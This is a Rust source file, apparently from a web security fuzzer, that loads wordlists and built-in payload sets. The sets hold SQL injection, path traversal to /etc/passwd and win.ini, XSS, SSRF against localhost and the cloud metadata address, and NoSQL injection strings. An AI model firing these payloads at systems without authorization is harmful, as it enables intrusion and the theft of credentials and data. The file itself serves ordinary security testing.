use super::args::Args;

pub fn load_payloads(args: &Args) -> anyhow::Result<Vec<String>> {
    if let Some(path) = &args.wordlist {
        let text = std::fs::read_to_string(path)?;
        return Ok(non_empty_lines(&text).map(str::to_string).collect());
    }
    match &args.payloads {
        Some(set) => builtin_payloads(set),
        None => Ok(Vec::new()),
    }
}

pub fn load_seeds(args: &Args) -> Vec<Vec<u8>> {
    let mut out = Vec::new();
    if let Some(path) = &args.wordlist {
        if let Ok(text) = std::fs::read_to_string(path) {
            out.extend(non_empty_lines(&text).map(|s| s.as_bytes().to_vec()));
        }
    }
    if let Some(set) = &args.payloads {
        if let Ok(payloads) = builtin_payloads(set) {
            out.extend(payloads.into_iter().map(String::into_bytes));
        }
    }
    if out.is_empty() {
        out.extend(
            ["test", "1", "id=1", "{\"a\":1}"]
                .into_iter()
                .map(|s| s.as_bytes().to_vec()),
        );
    }
    out
}

fn non_empty_lines(text: &str) -> impl Iterator<Item = &str> {
    text.lines().map(str::trim).filter(|line| !line.is_empty())
}

fn builtin_payloads(set: &str) -> anyhow::Result<Vec<String>> {
    let values = match set {
        "sqli" => SQLI,
        "traversal" => TRAVERSAL,
        "xss" => XSS,
        "ssrf" => SSRF,
        "nosql" => NOSQL,
        _ => anyhow::bail!("unknown payload set '{set}'"),
    };
    Ok(values.iter().map(|s| s.to_string()).collect())
}

const SQLI: &[&str] = &[
    "'",
    "\"",
    "' OR '1'='1",
    "1 OR 1=1",
    "'--",
    "\") OR (\"1\"=\"1",
    "' AND SLEEP(3)-- -",
    "1); SELECT pg_sleep(3)--",
    "' UNION SELECT NULL-- -",
];
const TRAVERSAL: &[&str] = &[
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
];
const XSS: &[&str] = &[
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
    "javascript:alert(1)",
];
const SSRF: &[&str] = &[
    "http://127.0.0.1",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "file:///etc/passwd",
    "http://127.0.0.1:9099/ssrf-canary",
];
const NOSQL: &[&str] = &[
    "[$ne]=1",
    "{\"$gt\":\"\"}",
    "' || '1'=='1",
    "{\"$where\":\"sleep(3000)\"}",
];
